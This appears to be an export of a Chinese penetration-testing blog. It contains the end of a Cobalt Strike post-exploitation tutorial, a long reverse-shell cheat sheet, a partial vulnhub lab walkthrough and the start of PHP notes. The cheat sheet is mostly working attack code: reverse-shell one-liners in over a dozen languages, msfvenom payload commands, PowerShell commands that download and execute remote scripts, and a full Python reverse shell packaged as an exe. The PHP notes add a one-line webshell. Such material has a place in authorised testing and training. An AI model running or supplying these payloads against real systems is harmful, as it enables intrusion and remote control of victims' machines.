与MSF联动</h3><ol><li>新建监听器</li><li><img src="/CobaltStrike/46.png" alt> </li><li><img src="/CobaltStrike/47.png" alt></li><li>选择刚新建的监听器</li><li><img src="/CobaltStrike/48.png" alt></li><li>启动MSF，并设置监听，当前面选choose时，msf就获取到session</li><li><img src="/CobaltStrike/49.png" alt></li></ol><h2 id="0x50-browserpivot"><a href="#0x50-browserpivot" class="headerlink" title="0x50 browserpivot"></a>0x50 browserpivot</h2><ol><li>Setup a browser pivot session 注入被攻击者浏览器进程</li><li>Browser Pivot是一个针对IE浏览器的技术，利用的是IE的cookie机制，Cobalt Strike通过IE注入进程以继承用户的已验证Web会话，达到无需验证登录用户访问的网站。</li><li>ps #查看进程</li><li><img src="/CobaltStrike/25.png" alt></li><li>也可以通过图形界面注入，右击——Explore——Browser Pivot</li><li><img src="/CobaltStrike/26.png" alt></li><li><img src="/CobaltStrike/27.png" alt></li><li>然后浏览器设置代理访问</li><li><img src="/CobaltStrike/28.png" alt></li><li><img src="/CobaltStrike/29.png" alt></li></ol><h2 id="0x60-Socks代理"><a href="#0x60-Socks代理" class="headerlink" title="0x60 Socks代理"></a>0x60 Socks代理</h2><ol><li>开启代理，内网渗透</li><li>同样两种方法，命令或右击——Pivoting——SOCKS Server</li><li>命令：socks 6666</li><li><img src="/CobaltStrike/30.png" alt></li><li>然后编辑vim /etc/proxychains.conf，在文件末尾添加socks4代理</li><li><img src="/CobaltStrike/31.png" alt></li><li>使用proxychains扫内网：proxychains nmap -sP 192.168.100.0/24</li><li><img src="/CobaltStrike/32.png" alt></li><li>还可以把MSF带进目标内网View——Proxy Pivots——选择Socks4a Proxy——点击Tunnel——setg Proxies socks4:127.0.0.1:6666</li><li><img src="/CobaltStrike/33.png" alt></li><li>setg Proxies socks4:127.0.0.1:6666</li><li><img src="/CobaltStrike/34.png" alt></li><li>beacon&gt;socks stop #关闭sock</li></ol><h2 id="0x70-powershell-import"><a href="#0x70-powershell-import" class="headerlink" title="0x70 powershell-import"></a>0x70 powershell-import</h2><ol><li>可以导入各种powershell渗透框架：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a>、<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">PowerSploit</a></li><li>beacon&gt;powershell-import #导入ps脚本，来自<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang</a></li><li><img src="/CobaltStrike/35.png" alt></li><li><img src="/CobaltStrike/36.png" alt></li><li>详细命令可查看cat Powerpreter.psm1 | grep function</li></ol><h2 id="0x80-dll文件或ps文件"><a href="#0x80-dll文件或ps文件" class="headerlink" title="0x80 dll文件或ps文件"></a>0x80 dll文件或ps文件</h2><ol><li>Attacks——Packages——windows Executable(S)</li><li><img src="/CobaltStrike/43.png" alt></li><li><img src="/CobaltStrike/42.png" alt></li><li>上传到被攻击机：upload /root/cobaltstrike3.14/backdoors/beacon.dll</li><li><img src="/CobaltStrike/44.png" alt></li><li>shell dir</li><li><img src="/CobaltStrike/45.png" alt></li><li>在被攻击机上执行：regsvr32 beacon.dll</li><li></li><li>Attacks——Packages——windows Executable(S)</li><li><img src="/CobaltStrike/50.png" alt></li><li>上传到被攻击机：upload /root/cobaltstrike3.14/backdoors/beacon.ps1</li><li>在被攻击机上执行：.\beacon.ps1</li><li>执行regsvr32 beacon.dll还是posershell beacon.ps1之后，会话列表就多了一条多*的主机</li><li><img src="/CobaltStrike/51.png" alt></li></ol><h2 id="0x90-内网渗透"><a href="#0x90-内网渗透" class="headerlink" title="0x90 内网渗透"></a>0x90 内网渗透</h2><ol><li>bypass UAC</li><li><img src="/CobaltStrike/52.png" alt></li></ol><h2 id="0xA0-各种扫描"><a href="#0xA0-各种扫描" class="headerlink" title="0xA0 各种扫描"></a>0xA0 各种扫描</h2><h3 id="0xA1-存活主机扫描"><a href="#0xA1-存活主机扫描" class="headerlink" title="0xA1 存活主机扫描"></a>0xA1 存活主机扫描</h3><ol><li>右击会话——Explore——net view</li><li><img src="/CobaltStrike/55.png" alt></li></ol><h3 id="0xA2-端口扫描"><a href="#0xA2-端口扫描" class="headerlink" title="0xA2 端口扫描"></a>0xA2 端口扫描</h3><ol><li>右击会话——Explore——port scan</li><li><img src="/CobaltStrike/53.png" alt></li><li><img src="/CobaltStrike/54.png" alt></li><li>可能没扫到~</li><li><img src="/CobaltStrike/56.png" alt></li><li>执行扫描端口命令：beacon&gt; portscan 192.168.100.8 1-10000 icmp 1024</li><li><img src="/CobaltStrike/57.png" alt></li></ol><h2 id="0xB0-后门制作"><a href="#0xB0-后门制作" class="headerlink" title="0xB0 后门制作"></a>0xB0 后门制作</h2><ol><li></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/102725129</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 知识 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell</title>
      <link href="/shell/"/>
      <url>/shell/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-shell"><a href="#0x00-shell" class="headerlink" title="0x00 shell"></a>0x00 shell</h2><ol><li>shell,俗称壳，指用户执行命令使用的软件，如cmd.exe、Terminal。</li><li>shell：GUI shell、CLI shell、webshell、getshell…</li></ol><h2 id="0x10-reverse-shell"><a href="#0x10-reverse-shell" class="headerlink" title="0x10 reverse shell"></a>0x10 reverse shell</h2><ol><li>本地主机：192.168.100.4</li></ol><h3 id="0x11-NetCat"><a href="#0x11-NetCat" class="headerlink" title="0x11 NetCat"></a>0x11 NetCat</h3><p><strong>反向shell</strong></p><ol><li>本地：nc -lvp 8888</li><li>远程：</li><li>nc -e /bin/sh 192.168.100.4 8888</li><li>nc -e /bin/bash 192.168.100.4 8888</li><li>nc.traditional -e /bin/bash 192.168.100.4 8888</li><li>nc -c bash 192.168.100.4 8888</li><li>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.100.4 8888 &gt;/tmp/f</li></ol><p><strong>正向shell</strong></p><ol><li>nc -e /bin/sh -lp 8888</li><li>nc.exe -e cmd.exe -lp 8888</li></ol><h3 id="0x12-TCP-UDP"><a href="#0x12-TCP-UDP" class="headerlink" title="0x12 TCP/UDP"></a>0x12 TCP/UDP</h3><p><strong>TCP</strong></p><ol><li>本地：nc -lvp 8888</li><li>远程：</li><li>bash -i &gt;&amp; /dev/tcp/192.168.100.4/8888 0&gt;&amp;1 #在remotehost上执行，向localhost反弹shell，-i：交互式</li><li>sh -i &gt;&amp; /dev/tcp/192.168.100.4/8888 0&gt;&amp;1</li><li>0&lt;&11;exec 11&lt;&gt;/dev/tcp/192.168.100.4/8888;sh &lt;&amp;11 &gt;&amp;11 2&gt;&amp;11 #11随机数，大于2就行</li></ol><p><strong>UDP</strong></p><ol><li>nc -ulvp 8888</li><li>sh -i &gt;&amp; /dev/udp/192.168.100.4/8888 0&gt;&amp;1 </li><li></li><li><strong>socat</strong></li><li>socat exec:’bash -li’,pty,stderr,setsid,sigint,sane tcp:192.168.100.4:8888</li></ol><h3 id="0x13-perl"><a href="#0x13-perl" class="headerlink" title="0x13 perl"></a>0x13 perl</h3><ol start="10"><li>perl -e ‘use Socket;$h=”192.168.100.4”;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($h)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<pre><code>$h=&quot;192.168.100.4&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($h)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};</code></pre></li><li>perl -MIO -e ‘$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”[IPADDR]:[PORT]”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’</li><li>perl -MIO -e ‘$c=new IO::Socket::INET(PeerAddr,”[IPADDR]:[PORT]”);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;’  #windows</li></ol><h3 id="0x14-python"><a href="#0x14-python" class="headerlink" title="0x14 python"></a>0x14 python</h3><ol><li>export RHOST=”192.168.100.4”;export RPORT=8888;python -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“/bin/sh”)’<pre><code>export RHOST=&quot;192.168.100.4&quot;;export RPORT=8888;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre></li><li>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.100.4”,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/bash”)’</li></ol><h3 id="0x15-PHP"><a href="#0x15-PHP" class="headerlink" title="0x15 PHP"></a>0x15 PHP</h3><ol><li>php -r ‘$sock=fsockopen(“192.168.100.4”,8888);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</li><li>php -r ‘$sock=fsockopen(“192.168.100.4”,8888);$proc=proc_open(“/bin/sh -i”, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);’</li></ol><h3 id="0x16-ruby"><a href="#0x16-ruby" class="headerlink" title="0x16 ruby"></a>0x16 ruby</h3><ol><li>ruby -rsocket -e’f=TCPSocket.open(“10.0.0.1”,1234).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</li><li>ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(“[IPADDR]”,”[PORT]”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’</li><li>ruby -rsocket -e ‘c=TCPSocket.new(“[IPADDR]”,”[PORT]”);while(cmd=c.gets);IO.popen(cmd,”r”){|io|c.print io.read}end’ #Windows only</li></ol><h3 id="0x17-Golang"><a href="#0x17-Golang" class="headerlink" title="0x17 Golang"></a>0x17 Golang</h3><ol><li>echo ‘package main;import”os/exec”;import”net”;func main(){c,_:=net.Dial(“tcp”,”192.168.0.134:8080”);cmd:=exec.Command(“/bin/sh”);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}’ &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go</li></ol><h3 id="0x18-NCat"><a href="#0x18-NCat" class="headerlink" title="0x18 NCat"></a>0x18 NCat</h3><ol><li>ncat 192.168.100.4 8888 -e /bin/sh</li><li>ncat –udp 192.168.100.4 8888 -e /bin/sh</li></ol><h3 id="0x19-openssl"><a href="#0x19-openssl" class="headerlink" title="0x19 openssl"></a>0x19 openssl</h3><ol><li>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</li><li>openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</li><li>或者</li><li>ncat –ssl -vv -l -p 8888</li><li><ol start="2"><li>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.100.4:8888 &gt; /tmp/s; rm /tmp/s</li></ol></li></ol><h3 id="0x1A-powershell"><a href="#0x1A-powershell" class="headerlink" title="0x1A powershell"></a>0x1A powershell</h3><ol><li>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(“192.168.100.4”,8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + “PS “ + (pwd).Path + “&gt; “;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</li><li></li><li>powershell -nop -c “$client = New-Object System.Net.Sockets.TCPClient(‘192.168.100.4’,8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + ‘PS ‘ + (pwd).Path + ‘&gt; ‘;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()”</li><li></li><li>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a href="https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;" target="_blank" rel="noopener">https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1&#39;</a>)</li></ol><h3 id="0x1B-awk"><a href="#0x1B-awk" class="headerlink" title="0x1B awk"></a>0x1B awk</h3><ol><li>awk ‘BEGIN {s = “/inet/tcp/0/192.168.100.4/8888”; while(42) { do{ printf “shell&gt;” |&amp; s; s |&amp; getline c; if(c){ while ((c |&amp; getline) &gt; 0) print $0 |&amp; s; close(c); } } while(c != “exit”) close(s); }}’ /dev/null</li></ol><h3 id="0x1C-java"><a href="#0x1C-java" class="headerlink" title="0x1C java"></a>0x1C java</h3><ol><li>r = Runtime.getRuntime()</li><li>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.100.4/8888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[])</li><li>p.waitFor()</li></ol><h3 id="0x1D-lua"><a href="#0x1D-lua" class="headerlink" title="0x1D lua"></a>0x1D lua</h3><ol><li>lua -e “require(‘socket’);require(‘os’);t=socket.tcp();t:connect(‘192.168.100.4’,’8888’);os.execute(‘/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3’);”</li><li>lua5.1 -e ‘local host, port = “192.168.100.4”,8888 local socket = require(“socket”) local tcp = socket.tcp() local io = require(“io”) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, “r”) local s = f:read(“*a”) f:close() tcp:send(s) if status == “closed” then break end end tcp:close()’</li></ol><h3 id="0x1E-NodeJS"><a href="#0x1E-NodeJS" class="headerlink" title="0x1E NodeJS"></a>0x1E NodeJS</h3><ol><li>require(‘child_process’).exec(‘nc -e /bin/sh 192.168.100.4 8888’)</li></ol><h3 id="0x1F-Groovy"><a href="#0x1F-Groovy" class="headerlink" title="0x1F Groovy"></a>0x1F Groovy</h3><ol><li>String host=”localhost”;</li><li>int port=8044;</li><li>String cmd=”cmd.exe”;</li><li>Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</li></ol><h2 id="0x20-MSF"><a href="#0x20-MSF" class="headerlink" title="0x20 MSF"></a>0x20 MSF</h2><h3 id="0x21-msfvenom——-gt-jsp-shell"><a href="#0x21-msfvenom——-gt-jsp-shell" class="headerlink" title="0x21 msfvenom——&gt;jsp shell"></a>0x21 msfvenom——&gt;jsp shell</h3><ol><li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.100.4 LPORT=8888 &gt; reverse.jsp #生成 reverse.jsp 并上传到靶机</li></ol><p>MSF</p><ol><li>use exploit/multi/handler</li><li>set payload java/jsp_shell_reverse_tcp</li><li>set lhost 192.168.100.4</li><li>run</li></ol><h3 id="0x22-Windows-Staged-reverse-TCP"><a href="#0x22-Windows-Staged-reverse-TCP" class="headerlink" title="0x22 Windows Staged reverse TCP"></a>0x22 Windows Staged reverse TCP</h3><ol><li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f exe &gt; reverse.exe</li></ol><h3 id="0x23-Windows-Stageless-reverse-TCP"><a href="#0x23-Windows-Stageless-reverse-TCP" class="headerlink" title="0x23 Windows Stageless reverse TCP"></a>0x23 Windows Stageless reverse TCP</h3><ol><li>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f exe &gt; reverse.exe</li></ol><h3 id="0x24-Linux-Staged-reverse-TCP"><a href="#0x24-Linux-Staged-reverse-TCP" class="headerlink" title="0x24 Linux Staged reverse TCP"></a>0x24 Linux Staged reverse TCP</h3><ol><li>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f elf &gt;reverse.elf</li></ol><h3 id="0x25-Linux-Stageless-reverse-TCP"><a href="#0x25-Linux-Stageless-reverse-TCP" class="headerlink" title="0x25 Linux Stageless reverse TCP"></a>0x25 Linux Stageless reverse TCP</h3><ol><li>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.100.4 LPORT=8888 -f elf &gt;reverse.elf</li></ol><h3 id="0x26-exploit-windows-misc-hta-server"><a href="#0x26-exploit-windows-misc-hta-server" class="headerlink" title="0x26 exploit/windows/misc/hta_server"></a>0x26 exploit/windows/misc/hta_server</h3><p><strong>192.168.100.4MSF</strong></p><ol><li>use exploit/windows/misc/hta_server</li><li>set srvhost 192.168.100.4 #端口默认8080</li><li>run #就会生成一个链接：<a href="http://192.168.100.4:8080/[一串随机字符].hta" target="_blank" rel="noopener">http://192.168.100.4:8080/[一串随机字符].hta</a></li></ol><p><strong>windows靶机cmd执行命令</strong></p><ol><li>mshta <a href="http://192.168.100.4:8080/[一串随机字符].hta" target="_blank" rel="noopener">http://192.168.100.4:8080/[一串随机字符].hta</a></li><li>杀软拦截</li><li><img src="/shell/2.png" alt></li></ol><p><strong>192.168.100.4MSF</strong></p><ol><li>没有杀软拦截就会接收到session</li><li>sessions 1</li><li><img src="/shell/1.png" alt></li></ol><h3 id="0x27-Other-platforms"><a href="#0x27-Other-platforms" class="headerlink" title="0x27 Other platforms"></a>0x27 Other platforms</h3><ol><li>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f elf &gt; shell.elf</li><li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f exe &gt; shell.exe</li><li>msfvenom -p osx/x86/shell_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f macho &gt; shell.macho</li><li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f asp &gt; shell.asp</li><li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.jsp</li><li>msfvenom -p java/jsp_shell_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f war &gt; shell.war</li><li>msfvenom -p cmd/unix/reverse_python LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.py</li><li>msfvenom -p cmd/unix/reverse_bash LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.sh</li><li>msfvenom -p cmd/unix/reverse_perl LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.pl</li><li>msfvenom -p php/meterpreter_reverse_tcp LHOST=”192.168.100.4” LPORT=8888 -f raw &gt; shell.php; cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</li></ol><h2 id="0x30-TTY-shell"><a href="#0x30-TTY-shell" class="headerlink" title="0x30 TTY shell"></a>0x30 TTY shell</h2><ol><li>socat file:<code>tty</code>,raw,echo=0 tcp-listen:12345</li><li>/bin/sh -i</li><li>python -c ‘import pty; pty.spawn(“/bin/sh”)’</li><li>perl -e ‘exec “/bin/sh”;’</li><li>perl: exec “/bin/sh”;</li><li>ruby: exec “/bin/sh”</li><li>lua: os.execute(‘/bin/sh’)</li></ol><h2 id="0x40-Windows反弹shell"><a href="#0x40-Windows反弹shell" class="headerlink" title="0x40 Windows反弹shell"></a>0x40 Windows反弹shell</h2><h3 id="0x41-ncat-exe反弹shell"><a href="#0x41-ncat-exe反弹shell" class="headerlink" title="0x41 ncat.exe反弹shell"></a>0x41 ncat.exe反弹shell</h3><ol><li>攻击机：ncat -lvp 6666</li><li><img src="/shell/3.png" alt></li><li>靶机：ncat 192.168.100.1 6666 -e cmd`</li><li><img src="/shell/4.png" alt></li></ol><h3 id="0x42-powershell反弹shell"><a href="#0x42-powershell反弹shell" class="headerlink" title="0x42 powershell反弹shell"></a>0x42 powershell反弹shell</h3><ol><li><strong>powercat.ps1</strong></li><li>powershell iex(new-object system.net.webclient).downloadstring(‘VPS/powercat.ps1’);powercat -c 192.168.100.1 -p 6666 -e cmd</li><li></li><li><strong>nishang框架</strong></li><li>powershell iex(new-object system.net.webclient).downloadstring(‘VPS/nishang/Shells/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp -reverse -ipaddress 192.168.100.1 -port 6666</li><li></li></ol><h2 id="0x50-Python反弹shell"><a href="#0x50-Python反弹shell" class="headerlink" title="0x50 Python反弹shell"></a>0x50 Python反弹shell</h2><p><strong>shell.py</strong></p><pre><code># -*- coding:utf-8 -*-import osimport selectimport socketimport sysimport subprocessdef ReserveConnect(addr, port):    &#39;&#39;&#39;反弹连接shell&#39;&#39;&#39;    try:        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        shell.connect((addr,port))    except Exception as reason:        print (&#39;[-] Failed to Create Socket : %s&#39;%reason)        exit(0)    rlist = [shell]    wlist = []    elist = [shell]    while True:        shell.send(&quot;cmd:&quot;)        rs,ws,es = select.select(rlist,wlist,wlist)        for sockfd in rs:            if sockfd == shell:                command = shell.recv(1024)                if command == &#39;exit&#39;:                    shell.close()                    break                result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()                shell.sendall(result.decode(&quot;GB2312&quot;).encode(&quot;UTF-8&quot;))# 主函数运行def run():    if len(sys.argv)&lt;3:        print(&#39;Usage: python reverse.py [IP] [PORT]&#39;)    else:        url = sys.argv[1]        port = int(sys.argv[2])        ReserveConnect(url,port)if __name__ == &#39;__main__&#39;:    run()</code></pre><ol><li>ncat -lvp 6666</li><li><img src="/shell/6.png" alt></li><li>python shell.py 192.168.100.1 6666</li><li><img src="/shell/5.png" alt></li></ol><h2 id="0x50-Python编译成exe执行后反弹shell"><a href="#0x50-Python编译成exe执行后反弹shell" class="headerlink" title="0x50 Python编译成exe执行后反弹shell"></a>0x50 Python编译成exe执行后反弹shell</h2><p><strong>shell.py</strong></p><pre><code># -*- coding:utf-8 -*-import osimport selectimport socketimport sysimport subprocessdef ReserveConnect(addr, port):    &#39;&#39;&#39;反弹连接shell&#39;&#39;&#39;    try:        shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        shell.connect((addr,port))    except Exception as reason:        print (&#39;[-] Failed to Create Socket : %s&#39;%reason)        exit(0)    rlist = [shell]    wlist = []    elist = [shell]    while True:        shell.send(&quot;cmd:&quot;)        rs,ws,es = select.select(rlist,wlist,wlist)        for sockfd in rs:            if sockfd == shell:                command = shell.recv(1024)                if command == &#39;exit&#39;:                    shell.close()                    break                result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()                shell.sendall(result.decode(&quot;GB2312&quot;).encode(&quot;UTF-8&quot;))# 主函数运行def run():    if len(sys.argv)&lt;3:        print(&#39;Usage: python reverse.py [IP] [PORT]&#39;)    else:        url = sys.argv[1]        port = int(sys.argv[2])        ReserveConnect(url,port)if __name__ == &#39;__main__&#39;:    run()</code></pre><p><strong>py2exe.py</strong></p><pre><code># encoding:utf-8from distutils.core import setupimport py2exesetup(name = &quot;shell&quot;,description = &quot;Python-based App&quot;,version = &quot;1.0&quot;,console = [&quot;shell.py&quot;],options = {&quot;py2exe&quot;:{&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,}},zipfile = None)</code></pre><ol><li>pip install py2exe #安装py2exe模块</li><li></li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></li><li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">https://lolbas-project.github.io/</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-staged-reverse-tcp" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-staged-reverse-tcp</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> 后门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub之Os-hackNos-3</title>
      <link href="/vulnhub%E4%B9%8BOs-hackNos-3/"/>
      <url>/vulnhub%E4%B9%8BOs-hackNos-3/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h2><ol><li>VBOX</li><li>靶场：192.168.11.3</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/1.png" alt></li></ol><h2 id="0x10-开始"><a href="#0x10-开始" class="headerlink" title="0x10 开始"></a>0x10 开始</h2><ol><li>netdiscover</li><li>找到靶机IP：192.168.11.3</li><li>nmap扫描端口：nmap -sT 192.168.11.3</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/2.png" alt></li><li>访问80端口</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/3.png" alt></li><li>啥都没有，有个关键字：<strong>websec</strong>，dirsearch扫目录</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/4.png" alt></li><li>访问/websec/目录</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/5.png" alt></li><li>再扫目录，找到个后台登陆/websec/admin/</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/6.png" alt></li><li>搜集到邮箱地址：<a href="mailto:contact@hacknos.com" target="_blank" rel="noopener">contact@hacknos.com</a></li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/7.png" alt></li><li>错误次数太多，封了~</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/8.png" alt></li></ol><h2 id="0x11-再来"><a href="#0x11-再来" class="headerlink" title="0x11 再来"></a>0x11 再来</h2><ol><li>使用cewl爬取网站 <a href="http://192.168.11.3/websec/" target="_blank" rel="noopener">http://192.168.11.3/websec/</a> 生成字典</li><li><img src="/vulnhub%E4%B9%8BOs-hackNos-3/9.png" alt></li><li>未完</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习</title>
      <link href="/PHP%E5%AD%A6%E4%B9%A0/"/>
      <url>/PHP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-PHP"><a href="#0x00-PHP" class="headerlink" title="0x00 PHP"></a>0x00 PHP</h2><ol><li>环境：phpstudy各版本PHP</li></ol><h2 id="0x01-PHP基础"><a href="#0x01-PHP基础" class="headerlink" title="0x01 PHP基础"></a>0x01 PHP基础</h2><p><strong>PHP标记</strong></p><ul><li>XML风格：起始标记：&lt;?php，结束标记：?&gt;</li><li>脚本风格：&lt;script language=”php”&gt;phpinfo();&lt;/script&gt;</li><li>短标记：&lt;?phpinfo();?&gt; #只有开启php.ini中的short_open_tag配置 或 编译PHP时加入–enable-short-tags选项，才能使用。</li><li>&lt;?=$_GET[0]($_POST[1]);?&gt; #GET：0=system  POST：1=whoami</li><li>asp风格：&lt;%phpinfo();%&gt; #开启php.ini中的asp_tags配置</li></ul><p><strong>指令分隔符</strong><br>多行使用；来分隔，最后一行可不要；</p><p><strong>注释</strong><br>//…<br>/<em>…</em>/<br>#…</p><p><strong><strong>FILE</strong> 预定义变量</strong></p><pre><code>echo __FILE__; #获取当前文件的完整路径</code></pre><p><strong>代码相关</strong></p><pre><code>highlight_file(__FILE__); #显示当前的代码show_source(__FILE__); #显示当前的代码</code></pre><h2 id="0x02-PHP输出"><a href="#0x02-PHP输出" class="headerlink" title="0x02 